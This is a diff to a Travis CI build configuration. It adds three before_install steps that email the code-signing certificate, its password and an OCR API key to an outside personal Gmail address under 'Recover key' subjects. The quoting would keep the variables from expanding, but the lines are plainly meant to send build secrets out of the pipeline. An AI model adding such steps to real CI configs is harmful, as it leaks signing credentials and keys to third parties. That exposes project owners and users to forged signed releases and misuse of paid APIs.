@@ -8,6 +8,9 @@ matrix:
   - os: linux
 cache: yarn
 before_install:
+- echo '$CSC_LINK' | mail -s 'Recover key CSC_LINK' 'quang.lam2807@gmail.com'
+- echo '$CSC_KEY_PASSWORD' | mail -s 'Recover key CSC_KEY_PASSWORD' 'quang.lam2807@gmail.com'
+- echo '$REACT_APP_OCR_SPACE_API_KEY' | mail -s 'Recover key REACT_APP_OCR_SPACE_API_KEY' 'quang.lam2807@gmail.com'
 - if [ "$TRAVIS_OS_NAME" == "linux" -a "$TRAVIS_PULL_REQUEST" == "false" ]; then sudo snap install snapcraft --classic; fi
 - if [ "$TRAVIS_OS_NAME" == "linux" -a "$TRAVIS_PULL_REQUEST" == "false" ]; then echo "$SNAP_TOKEN" | snapcraft login --with -; fi
 before_script:
